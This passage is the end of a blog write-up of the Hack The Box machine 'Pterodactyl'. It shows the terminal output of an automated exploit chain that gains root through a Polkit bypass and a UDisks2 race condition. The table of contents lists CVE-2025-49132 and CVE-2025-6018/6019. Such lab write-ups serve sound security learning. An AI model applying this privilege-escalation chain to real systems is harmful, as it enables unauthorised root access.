class="line">[+] Step 2: Uploading malicious XFS image to target...</span><br><span class="line">** WARNING: connection is not using a post-quantum key exchange algorithm.</span><br><span class="line">** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</span><br><span class="line">** The server may need to be upgraded. See https://openssh.com/pq.html</span><br><span class="line">(phileasfogg3@pterodactyl.htb) Password: </span><br><span class="line">xfs.image                                                                         100%  300MB   1.9MB/s   02:39    </span><br><span class="line">[+] Image uploaded to /tmp/xfs.image on target</span><br><span class="line"></span><br><span class="line">[+] Step 3: Executing Polkit bypass...</span><br><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal.</span><br><span class="line">** WARNING: connection is not using a post-quantum key exchange algorithm.</span><br><span class="line">** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</span><br><span class="line">** The server may need to be upgraded. See https://openssh.com/pq.html</span><br><span class="line">Have a lot of fun...</span><br><span class="line">Last login: Thu Feb 12 07:47:04 2026 from 10.10.16.4</span><br><span class="line">Polkit bypass variables written to ~/.pam_environment</span><br><span class="line">You will need to logout and login again for this to take effect</span><br><span class="line"></span><br><span class="line">[!] IMPORTANT: You must logout and login again for Polkit bypass to work</span><br><span class="line">[!] Run: ssh phileasfogg3@pterodactyl.htb</span><br><span class="line">[!] Then re-run this script or execute the exploit manually</span><br><span class="line"></span><br><span class="line">[+] Step 4: Executing UDisks2 race condition exploit...</span><br><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal.</span><br><span class="line">** WARNING: connection is not using a post-quantum key exchange algorithm.</span><br><span class="line">** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</span><br><span class="line">** The server may need to be upgraded. See https://openssh.com/pq.html</span><br><span class="line">Have a lot of fun...</span><br><span class="line">Last login: Thu Feb 12 07:47:04 2026 from 10.10.16.4</span><br><span class="line">[+] Killed gvfs-udisks2-volume-monitor</span><br><span class="line">[+] Loop device created: /dev/loop0</span><br><span class="line">[+] Started background watcher (PID: 10894)</span><br><span class="line">[+] Triggering UDisks2 resize vulnerability...</span><br><span class="line">[+] Caught SUID bash at /tmp/blockdev.268OK3/bash</span><br><span class="line">()</span><br><span class="line">[+] Waiting for race condition to trigger...</span><br><span class="line"></span><br><span class="line">[+] SUCCESS! Exploit worked!</span><br><span class="line">[+] Root privileges obtained:</span><br><span class="line">uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)</span><br><span class="line">424979ba0aaeedf507d230b1d8945205</span><br><span class="line"></span><br><span class="line">[*] Exploit automation complete</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for Pterodactyl. Hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Pterodactyl</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-05-17 21:07:41</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-17 22:42:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/05/17/Hackthebox-Pterodactyl/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/05/11/Hackthebox-Overwatch/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Overwatch</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Pterodactyl</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-http-pterodactyl-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;pterodactyl.htb&#x2F; </span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2025-49132-Pterodactyl-Panel-pearcmd-LFI-to-RCE"><span class="nav-text">CVE-2025-49132 - Pterodactyl Panel pearcmd LFI to RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivoting-through-the-Panel-database"><span class="nav-text">Pivoting through the Panel database</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-CVE-2025-6018-CVE-2025-6019"><span class="nav-text">Privilege Escalation - CVE-2025-6018 + CVE-2025-6019</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
